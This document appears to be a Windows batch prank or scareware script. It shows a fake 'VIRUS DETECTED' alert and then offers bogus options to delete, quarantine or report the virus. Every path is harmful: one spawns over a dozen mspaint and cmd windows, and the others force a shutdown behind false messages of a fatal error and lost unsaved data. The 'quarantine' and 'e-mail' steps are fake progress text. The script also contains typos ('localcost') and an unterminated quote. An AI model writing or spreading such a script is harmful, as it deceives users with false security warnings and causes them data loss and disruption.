@echo off
title WARNING!!! VIRUS DETECTED!

set input=
set /p input=A virus has been found on your computer. To delete it, press D, to ignore this alert, press i. 
if %input%==d goto d
if %input%==i goto i

echo waiting for response...
ping localhost -n 1 >nul

echo waiting for response......
ping localhost -n 1 >nul

:i
start
start mspaint
start mspaint
start mspaint
start mspaint
start mspaint
start mspaint
start mspaint
start mspaint
start mspaint
start mspaint
start mspaint
start mspaint
start cmd
start mspaint

:d
set input=
set /p input=Please choose one of the three options. 1. Delete the virus. 2. Send to quarantine using your default AntiVirus. 3. Send a virus notification to Windows. 
if %input%==1 goto 1
if %input%==2 goto 2
if %input%==3 goto 3

:1

echo loading...
ping localhost -n 1 >nul
cls
echo loading......
ping localhost -n 1 >nul
cls
start shutdown -s -t 180 -c "Please Restart your Computer for the function to work and run this program again, selecting the second option. 


:2
echo accesing quarantine...
ping localcost -n 5 >nul
echo accesing quarantine......
ping localcost -n 5 >nul
echo accesing quarantine...
ping localcost -n 5 >nul
echo accesing quarantine......
ping localcost -n 5 >nul
echo accesing quarantine...
ping localcost -n 5 >nul
echo accesing quarantine......
ping localcost -n 5 >nul
start shutdown -s -t 150 -c "The system has had to shut down due to a fatal error concerning the virus in your computer. All unsaved data will be lost"

:3
echo Sending virus notifier...
ping localhost -n 3 >nul
cls
echo Sending virus notifier......
ping localhost -n 3 >nul
cls
echo Sending virus notifier...
ping localhost -n 3 >nul
cls
echo Sending virus notifier......
ping localhost -n 3 >nul
cls
echo Sending virus notifier...
ping localhost -n 3 >nul
cls
echo Sending virus notifier......
ping localhost -n 3 >nul
cls
echo Sending virus notifier...
ping localhost -n 3 >nul
cls
echo Sending virus notifier......
ping localhost -n 3 >nul
cls
set input=
set /p input=sending the file could take some time. Do you want to proceed? Y/N
if %input%==y goto y
if %input%==n goto n
:y
echo Connecting internet server...please wait
ping localhost -n 3 >nul
cls
echo Connecting internet server....please wait
ping localhost -n 3 >nul
cls
echo Connecting internet server.....please wait
ping localhost -n 3 >nul
cls
echo Connecting internet server......please wait
ping localhost -n 3 >nul
cls
echo Connected
ping localhost -n 3 >nul
cls
echo Accesing e-mail notifier software...
ping localhost -n 3 >nul
cls
echo Accesing e-mail notifier software......
ping localhost -n 3 >nul
cls
echo Accesing e-mail notifier software...
ping localhost -n 3 >nul
cls
echo Accesing e-mail notifier software......
ping localhost -n 3 >nul
cls
echo E-mail software accesed
ping localhost -n 3 >nul
cls
echo Sending e-mail and software notes...
ping localhost -n 3 >nul
cls
echo Sending e-mail and software notes......
ping localhost -n 3 >nul
cls
echo Sending e-mail and software notes...
ping localhost -n 3 >nul
cls
echo Sending e-mail and software notes......
ping localhost -n 3 >nul
cls
echo Software sended
ping localhost -n 3 >nul
cls
echo All actions proceeded completely
ping localhost -n 3 >nul

:n
shutdown -s -t 30 -c "iam freaking tired of this iam just shutting down the computer and running the virus!!!!"
